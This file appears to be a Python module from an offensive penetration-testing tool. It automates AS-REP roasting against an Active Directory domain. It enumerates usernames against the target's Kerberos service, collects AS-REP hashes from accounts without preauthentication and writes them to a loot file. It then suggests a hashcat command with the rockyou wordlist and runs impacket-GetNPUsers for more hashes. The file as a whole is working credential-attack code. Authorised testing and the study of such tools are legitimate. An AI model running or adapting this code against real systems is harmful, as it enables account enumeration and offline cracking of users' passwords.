from __future__ import annotations

from pathlib import Path

from .. import runner, ui
from ..modules import kerbrute
from ..state import Findings, loot_dir


async def run(findings: Findings, *, users_path: Path) -> None:
    ui.banner(2, findings.target.ip,
              {"domain": findings.target.domain or "?",
               "users": str(users_path),
               "goal": "AS-REP roasting"})

    if not findings.target.domain:
        ui.bad("stage 2 requires a domain. Use -d <domain>.")
        return
    if not users_path or not Path(users_path).exists():
        ui.bad(f"users file not found: {users_path}")
        return
    if 88 not in findings.target.open_ports:
        ui.warn("Kerberos (88) not detected as open. AS-REP roast will fail.")

    ui.section("AS-REP roasting")
    candidates = _load_userlist(Path(users_path))
    ui.info(f"loaded {len(candidates)} candidate user(s) from {users_path}")
    ui.explain(
        "AS-REP roasting targets accounts with UF_DONT_REQUIRE_PREAUTH set. "
        "We send a bare AS-REQ; if the KDC replies with AS-REP we extract "
        "the encrypted timestamp and crack it offline (hashcat -m 18200)."
    )

    kdc = findings.target.fqdn or findings.target.ip
    pool_size = runner.opsec_int("kerb_pool", 20)
    results = await kerbrute.probe_many(
        candidates, findings.target.domain, kdc,
        concurrency=pool_size, timeout=4.0,
    )

    new_hashes: list[str] = []
    confirmed = 0
    not_exist = 0
    skew = 0
    other = 0
    for name, (status, hash_value) in results.items():
        if status == "USER_EXISTS_PREAUTH":
            findings.add_user(name)
            confirmed += 1
        elif status == "USER_EXISTS_NOPREAUTH":
            findings.add_user(name)
            ui.crit(f"AS-REP roastable: {name}")
            if hash_value and hash_value not in findings.asrep_hashes:
                findings.asrep_hashes.append(hash_value)
                new_hashes.append(hash_value)
        elif status == "USER_NOT_EXIST":
            not_exist += 1
        elif status == "SKEW":
            skew += 1
        else:
            other += 1

    ui.good(
        f"summary: {confirmed} confirmed users, {len(new_hashes)} AS-REP hashes, "
        f"{not_exist} non-existent, {skew} skewed, {other} other"
    )

    if skew:
        ui.warn(f"clock skew detected. Run: sudo rdate -n {findings.target.ip}")

    if new_hashes:
        out = loot_dir(findings.target.ip) / "asrep_hashes.txt"
        if out.exists():
            existing = out.read_text().splitlines()
            combined = sorted(set(existing) | set(new_hashes))
        else:
            combined = sorted(new_hashes)
        out.write_text("\n".join(combined) + "\n")
        ui.good(f"saved {len(new_hashes)} hash(es) -> {out}")
        ui.next_step(
            f"hashcat -m 18200 {out} /usr/share/wordlists/rockyou.txt",
            "RC4 etype = mode 18200; AES128 = 19600; AES256 = 19700",
        )

    await _verify_with_impacket(findings, users_path)


def _load_userlist(path: Path) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for line in path.read_text(errors="replace").splitlines():
        clean = line.strip()
        if clean and not clean.startswith("#") and clean.lower() not in seen:
            seen.add(clean.lower())
            out.append(clean)
    return out


async def _verify_with_impacket(findings: Findings, users_path: Path) -> None:
    if not runner.has("GetNPUsers"):
        return
    ui.explain(
        "verification: impacket-GetNPUsers makes an authoritative pass with "
        "the same userlist. Useful for cross-checking native probe coverage."
    )
    cmd = [
        runner.resolve("GetNPUsers") or "impacket-GetNPUsers",
        f"{findings.target.domain}/", "-no-pass",
        "-usersfile", str(users_path),
        "-dc-ip", findings.target.ip,
        "-format", "hashcat",
    ]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=180)
    new_hashes: list[str] = []
    for line in result.combined.splitlines():
        if line.startswith("$krb5asrep$") and line not in findings.asrep_hashes:
            findings.asrep_hashes.append(line)
            new_hashes.append(line)
    if new_hashes:
        ui.good(f"impacket-GetNPUsers found {len(new_hashes)} additional hash(es)")
        out = loot_dir(findings.target.ip) / "asrep_hashes.txt"
        existing = out.read_text().splitlines() if out.exists() else []
        combined = sorted(set(existing) | set(new_hashes))
        out.write_text("\n".join(combined) + "\n")
